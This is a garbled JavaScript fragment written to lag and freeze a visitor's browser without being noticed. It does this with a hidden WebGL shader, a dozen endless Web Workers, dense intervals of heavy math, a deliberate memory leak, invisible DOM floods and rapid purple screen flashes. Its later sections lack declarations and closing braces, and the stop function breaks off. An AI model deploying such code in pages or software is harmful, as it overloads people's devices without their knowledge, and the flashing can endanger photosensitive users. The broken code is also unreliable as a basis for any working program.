    // Super extreme CPU/GPU lag — invisible WebGL compute shaders + heavy loops
    let lagWorkers = [];
    let animationFrameId = null;
    let heavyIntervalIds = [];
    let canvas3d = null;
    let glContext = null;
    let renderLoopActive = false;
    
    function startExtremeInvisibleLag() {
        // 1. Hidden WebGL context that does insane matrix computations
        canvas3d = document.createElement('canvas');
        canvas3d.width = 64;
        canvas3d.height = 64;
        canvas3d.style.display = 'none';
        document.body.appendChild(canvas3d);
        
        try {
            glContext = canvas3d.getContext('webgl') || canvas3d.getContext('experimental-webgl');
            if (glContext) {
                // Create a shader that does heavy computations on GPU
                const vertexShaderSource = `
                    attribute vec2 a_position;
                    void main() {
                        gl_Position = vec4(a_position, 0.0, 1.0);
                    }
                `;
                const fragmentShaderSource = `
                    precision highp float;
                    uniform float u_time;
                    void main() {
                        float sum = 0.0;
                        for(int i = 0; i < 100000; i++) {
                            sum += sin(float(i) * u_time) * cos(float(i) * u_time * 0.5);
                        }
                        gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);
                    }
                `;
                
                function compileShader(gl, source, type) {
                    const shader = gl.createShader(type);
                    gl.shaderSource(shader, source);
                    gl.compileShader(shader);
                    return shader;
                }
                
                const vs = compileShader(glContext, vertexShaderSource, glContext.VERTEX_SHADER);
                const fs = compileShader(glContext, fragmentShaderSource, glContext.FRAGMENT_SHADER);
                const program = glContext.createProgram();
                glContext.attachShader(program, vs);
                glContext.attachShader(program, fs);
                glContext.linkProgram(program);
                glContext.useProgram(program);
                
                const buffer = glContext.createBuffer();
                glContext.bindBuffer(glContext.ARRAY_BUFFER, buffer);
                const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
                glContext.bufferData(glContext.ARRAY_BUFFER, vertices, glContext.STATIC_DRAW);
                const positionLoc = glContext.getAttribLocation(program, 'a_position');
                glContext.enableVertexAttribArray(positionLoc);
                glContext.vertexAttribPointer(positionLoc, 2, glContext.FLOAT, false, 0, 0);
                
                let time = 0;
                function renderHeavy() {
                    if (!renderLoopActive) return;
                    time += 0.01;
                    glContext.uniform1f(glContext.getUniformLocation(program, 'u_time'), time);
                    glContext.drawArrays(glContext.TRIANGLE_STRIP, 0, 4);
                    // Force GPU to work extremely hard
                    for(let i = 0; i < 10; i++) {
                        glContext.drawArrays(glContext.TRIANGLE_STRIP, 0, 4);
                    }
                    animationFrameId = requestAnimationFrame(renderHeavy);
                }
                renderLoopActive = true;
                renderHeavy();
            }
        } catch(e) { console.log(e); }
        
        // 2. Multiple Web Workers doing infinite heavy calculations (invisible)
        for (let w = 0; w < 12; w++) {
            const workerCode = `
                let running = true;
                function ultraHeavy() {
                    let result = 0;
                    for(let i = 0; i < 20000000; i++) {
                        result += Math.sqrt(i) * Math.sin(i) * Math.cos(i) * Math.tan(i) * Math.log(i+1);
                        if(i % 1000000 === 0 && !running) break;
                    }
                    if(running) setTimeout(ultraHeavy, 0);
                }
                ultraHeavy();
                self.onmessage = (e) => { if(e.data === 'stop') running = false; };
            `;
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const worker = new Worker(URL.createObjectURL(blob));
            lagWorkers.push(worker);
        }
        
        // 3. Extreme CPU saturation: multiple setIntervals with heavy loops
        for (let i = 0; i < 20; i++) {
            const intervalId = setInterval(() => {
                let waste = 0;
                for (let j = 0; j < 800000; j++) {
                    waste += Math.sin(j) * Math.cos(j) * Math.tan(j);
                }
                // Additional memory allocation to stress GC
                const dummyArray = new Array(50000).fill(Math.random());
            }, 5);
            heavyIntervalIds.push(intervalId);
        }
        
        // 4. Infinite recursion simulation (through async to not crash instantly but freeze)
        function deepRecursion(count) {
            if (count > 100000) return;
            const arr = [];
            for (let i = 0; i < 10000; i++) arr.push(Math.random());
            deepRecursion(count + 1);
        }
        setTimeout(() => { deepRecursion(0); }, 100);
        
        // 5. Memory leak: constantly allocate and hold large arrays
        let memoryLeaks = [];
        setInterval(() => {
            if (renderLoopActive) {
                const hugeArray = new Array(200000).fill('█'.repeat(100));
                memoryLeaks.push(hugeArray);
                if (memoryLeaks.length > 50) memoryLeaks = memoryLeaks.slice(-30);

        }, 50);
        
        // 6. DOM mutation flood (invisible tiny elements)

            if (!renderLoopActive) return;
            for (let f = 0; f < 200; f++) {

                hiddenDiv.style.width = '1px';
                hiddenDiv.style.height = '1px';
                hiddenDiv.style.opacity = '0';
                hiddenDiv.style.pointerEvents = 'none';

                document.body.appendChild(hiddenDiv);
                setTimeout(() => { if(hiddenDiv.parentNode) hiddenDiv.remove(); }, 100);

        }, 20);
        heavyIntervalIds.push(domFloodInterval);
        
        // 7. Purple flash every 0.5-1.5 seconds during lag

                setTimeout(() => {

        heavyIntervalIds.push(purpleFlashInterval);
        
        // 8. Additional random purple flashes

                document.body.style.backgroundColor = '#d500f9';
                setTimeout(() => {
                    if (renderLoopActive) document.body.style.backgroundColor = 'white';

            }
        }, 300);
        heavyIntervalIds.push(randomPurple);

    function stopExtremeLag() {
        renderLoopActive = false;

        if (canvas3d && canvas3d.parentNode) canvas3d.parentNode.removeChild(canvas3d);
